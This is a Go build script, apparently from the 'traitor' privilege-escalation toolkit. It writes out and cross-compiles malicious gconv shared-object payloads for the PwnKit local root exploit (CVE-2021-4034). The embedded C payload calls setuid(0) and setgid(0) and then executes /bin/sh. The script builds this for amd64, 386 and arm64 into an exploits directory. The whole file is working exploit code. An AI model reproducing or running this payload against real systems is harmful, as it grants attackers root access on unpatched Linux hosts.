package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
)

const outputDir = "pkg/exploits/cve20214034/libs"

func main() {
	if err := buildPwnkitSharedObjects(); err != nil {
		panic(err)
	}
}

func buildPwnkitSharedObjects() error {

	for _, platform := range []struct {
		goarch string
		binary string
		args   []string
	}{
		{
			goarch: "amd64",
			binary: "gcc",
			args:   []string{"-Wall", "--shared", "-fPIC", "-o"},
		},
		{
			goarch: "386",
			binary: "i686-linux-gnu-gcc",
			args:   []string{"-m32", "-Wall", "--shared", "-fPIC", "-o"},
		},
		{
			goarch: "arm64",
			binary: "aarch64-linux-gnu-gcc",
			args:   []string{"-Wall", "--shared", "-fPIC", "-o"},
		},
	} {

		for _, command := range []string{"/bin/sh", "/usr/bin/true"} {

			desc := filepath.Base(command)

			pwnkitSrc := fmt.Sprintf(`#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {}

void gconv_init(void *step) {
  char *const args[] = {"%s", NULL};
  char *const environ[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/"
                           "bin:/sbin:/bin:/opt/bin",
                           NULL};
  setuid(0);
  setgid(0);
  execve(args[0], args, environ);
  exit(0);
}`, command)

			sourcePath := filepath.Join(os.TempDir(), "traitor.c")
			outPath := filepath.Join(outputDir, fmt.Sprintf("cve20214034_%s_%s.so", desc, platform.goarch))
			if err := ioutil.WriteFile(sourcePath, []byte(pwnkitSrc), 0600); err != nil {
				return err
			}
			if err := exec.Command(platform.binary, append(platform.args, outPath, sourcePath)...).Run(); err != nil {
				return err
			}

		}
	}

	return nil

}
